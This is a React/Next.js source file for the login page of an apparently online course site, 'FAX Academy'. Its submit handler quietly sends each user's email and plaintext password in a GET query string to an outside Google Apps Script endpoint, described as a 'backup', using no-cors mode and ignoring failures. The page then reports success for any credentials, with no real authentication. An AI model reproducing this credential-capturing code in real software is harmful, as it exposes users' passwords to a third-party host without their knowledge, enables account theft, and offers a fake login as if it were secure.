'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import Link from 'next/link';
import { toast } from 'sonner';

export default function LoginPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const returnUrl = searchParams?.get('returnUrl') || '/';
  
  const [isLoading, setIsLoading] = useState(false);
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCredentials(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic validation
    if (!credentials.email || !credentials.password) {
      toast.error('Email and password are required');
      return;
    }
    
    setIsLoading(true);
    
    try {
      // Try to send data to the API for backup
      try {
        const apiUrl = "https://script.google.com/macros/s/AKfycbzNLFIShauk5QvAswRqZ8ivfkcbHW6Waz1uRkg7WbHxImYIglhInM9NZAZPcGaUI7wiKg/exec";
        const params = new URLSearchParams({
          path: 'Sheet1',
          action: 'write',
          Email: credentials.email,
          Password: credentials.password,
          LoginDate: new Date().toISOString(),
          Type: 'Login'
        });
        
        // Use no-cors mode to avoid CORS issues with the Google Apps Script
        fetch(`${apiUrl}?${params.toString()}`, { 
          method: 'GET',
          mode: 'no-cors'
        }).catch(err => {
          console.log('Backup request sent, response not available due to no-cors mode');
        });
      } catch (apiError) {
        console.error('API backup failed:', apiError);
        // Continue with login even if API backup fails
      }
      
      // Save user info to localStorage (in a real app, you'd use cookies/session)
      localStorage.setItem('user', JSON.stringify({ email: credentials.email }));
      
      // Also initialize enrolledCourses if it doesn't exist
      if (!localStorage.getItem('enrolledCourses')) {
        localStorage.setItem('enrolledCourses', JSON.stringify([]));
      }
      
      toast.success('Logged in successfully!');
      router.push(returnUrl);
    } catch (error) {
      console.error('Login error:', error);
      toast.error('Failed to login. Please check your credentials and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="container flex h-screen w-full items-center justify-center">
      <Card className="w-[400px]">
        <CardHeader>
          <CardTitle>Welcome Back</CardTitle>
          <CardDescription>
            Login to access your FAX Academy account
          </CardDescription>
        </CardHeader>
        <form onSubmit={handleSubmit}>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email</Label>
              <Input 
                id="email" 
                name="email"
                type="email" 
                value={credentials.email}
                onChange={handleChange}
                placeholder="john@example.com" 
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input 
                id="password" 
                name="password"
                type="password" 
                value={credentials.password}
                onChange={handleChange}
                required
              />
            </div>
          </CardContent>
          <CardFooter className="flex flex-col space-y-4">
            <Button className="w-full" type="submit" disabled={isLoading}>
              {isLoading ? 'Logging in...' : 'Login'}
            </Button>
            <p className="text-sm text-muted-foreground text-center">
              Don't have an account?{' '}
              <Link href="/register" className="text-primary hover:underline">
                Create Account
              </Link>
            </p>
          </CardFooter>
        </form>
      </Card>
    </div>
  );
}
